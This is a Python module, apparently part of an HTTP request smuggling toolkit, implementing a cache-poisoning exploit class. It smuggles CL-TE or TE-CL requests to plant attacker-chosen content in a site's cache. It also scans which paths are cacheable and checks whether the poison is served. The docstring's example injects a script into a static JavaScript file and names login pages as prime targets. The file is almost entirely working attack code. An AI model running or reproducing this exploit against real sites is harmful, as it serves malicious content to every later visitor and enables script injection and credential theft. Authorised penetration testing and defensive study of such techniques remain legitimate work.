"""
Cache Poisoning Exploit Module

Exploits HTTP smuggling to poison web caches with malicious content.
"""

from typing import Optional, Dict, List
from dataclasses import dataclass
import time

from core.connection import RawHTTPClient
from core.parser import HTTPResponseParser
from payloads.generator import PayloadGenerator


@dataclass
class CachePoisonResult:
    """Result of cache poisoning attempt"""
    success: bool
    target_path: str
    poisoned_content: str = ""
    cache_headers: Dict[str, str] = None
    verification_response: str = ""
    details: str = ""


class CachePoisoner:
    """
    Exploits HTTP smuggling to poison web caches.
    
    Cache poisoning via smuggling works by:
    1. Smuggling a request for a cached resource
    2. The smuggled response gets cached
    3. Subsequent users receive the poisoned content
    
    This is particularly dangerous for:
    - Static assets (JS, CSS)
    - API responses
    - Login pages
    
    Example:
        poisoner = CachePoisoner("https://example.com", technique="cl-te")
        result = poisoner.poison("/static/app.js", "<script>alert(1)</script>")
        
        if result.success:
            print("Cache poisoned successfully!")
    """
    
    def __init__(
        self,
        target_url: str,
        technique: str = "cl-te",
        timeout: float = 10.0,
        verify_ssl: bool = False
    ):
        """
        Initialize cache poisoner.
        
        Args:
            target_url: Target URL
            technique: Smuggling technique (cl-te, te-cl)
            timeout: Request timeout
            verify_ssl: Verify SSL certificates
        """
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_ssl = parsed.scheme == "https"
        self.technique = technique
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        
        self.parser = HTTPResponseParser()
        self.payload_gen = PayloadGenerator(self.host)
        
    def _create_client(self) -> RawHTTPClient:
        """Create a new HTTP client"""
        return RawHTTPClient(
            host=self.host,
            port=self.port,
            use_ssl=self.use_ssl,
            timeout=self.timeout,
            verify_ssl=self.verify_ssl
        )
        
    def check_cacheability(self, path: str) -> Dict[str, any]:
        """
        Check if a path is cacheable.
        
        Args:
            path: Path to check
            
        Returns:
            Dictionary with cacheability info
        """
        client = self._create_client()
        
        try:
            client.connect()
            response_bytes, _ = client.send_request(
                method="GET",
                path=path,
                headers={"Host": self.host}
            )
            
            response = self.parser.parse(response_bytes)
            
            cache_control = response.get_header("Cache-Control", "").lower()
            age = response.get_header("Age", "")
            x_cache = response.get_header("X-Cache", "").lower()
            
            is_cached = (
                "hit" in x_cache or
                age.isdigit() and int(age) > 0 or
                "public" in cache_control or
                "max-age" in cache_control
            )
            
            return {
                "cacheable": is_cached,
                "cache_control": cache_control,
                "age": age,
                "x_cache": x_cache,
                "all_cache_headers": {
                    "Cache-Control": response.get_header("Cache-Control"),
                    "Age": age,
                    "X-Cache": x_cache,
                    "Vary": response.get_header("Vary"),
                    "ETag": response.get_header("ETag"),
                }
            }
            
        finally:
            client.close()
    
    def poison(
        self,
        target_path: str,
        malicious_response: Optional[str] = None,
        smuggle_path: str = "/poison-check"
    ) -> CachePoisonResult:
        """
        Attempt to poison a cached path.
        
        Args:
            target_path: Path to poison (e.g., /static/app.js)
            malicious_response: Content to inject (optional)
            smuggle_path: Path for smuggled request
            
        Returns:
            CachePoisonResult with outcome
        """
        # Build smuggling payload
        payload = self.payload_gen.cache_poison_payload(
            technique=self.technique,
            poisoned_path=target_path,
            malicious_content=malicious_response or ""
        )
        
        client = self._create_client()
        
        try:
            client.connect()
            
            # Send poisoning request
            response_bytes, _ = client.send_raw(payload.encode())
            response = self.parser.parse(response_bytes)
            
            # Wait for cache to update
            time.sleep(1)
            
        finally:
            client.close()
            
        # Verify poisoning
        verification = self._verify_poison(target_path, malicious_response)
        
        return CachePoisonResult(
            success=verification["poisoned"],
            target_path=target_path,
            poisoned_content=malicious_response or "",
            cache_headers=verification.get("cache_headers"),
            verification_response=verification.get("response", ""),
            details=verification.get("details", "")
        )
    
    def _verify_poison(
        self,
        path: str,
        expected_content: Optional[str]
    ) -> Dict[str, any]:
        """Verify if cache was poisoned"""
        client = self._create_client()
        
        try:
            client.connect()
            response_bytes, _ = client.send_request(
                method="GET",
                path=path,
                headers={"Host": self.host}
            )
            
            response = self.parser.parse(response_bytes)
            body = response.body.decode("utf-8", errors="ignore")
            
            # Check if expected content is in response
            if expected_content and expected_content in body:
                return {
                    "poisoned": True,
                    "response": body[:500],
                    "details": "Malicious content found in cached response"
                }
            
            # Check for anomalies
            if response.status_code != 200:
                return {
                    "poisoned": False,
                    "response": body[:500],
                    "details": f"Unexpected status code: {response.status_code}"
                }
                
            return {
                "poisoned": False,
                "response": body[:500],
                "cache_headers": {
                    "Cache-Control": response.get_header("Cache-Control"),
                    "Age": response.get_header("Age"),
                    "X-Cache": response.get_header("X-Cache"),
                },
                "details": "Content not modified"
            }
            
        finally:
            client.close()
    
    def find_poisonable_paths(self, paths: List[str]) -> List[Dict]:
        """
        Find which paths are potentially poisonable.
        
        Args:
            paths: List of paths to check
            
        Returns:
            List of paths with cacheability info
        """
        results = []
        
        for path in paths:
            info = self.check_cacheability(path)
            if info["cacheable"]:
                results.append({
                    "path": path,
                    **info
                })
                
        return results
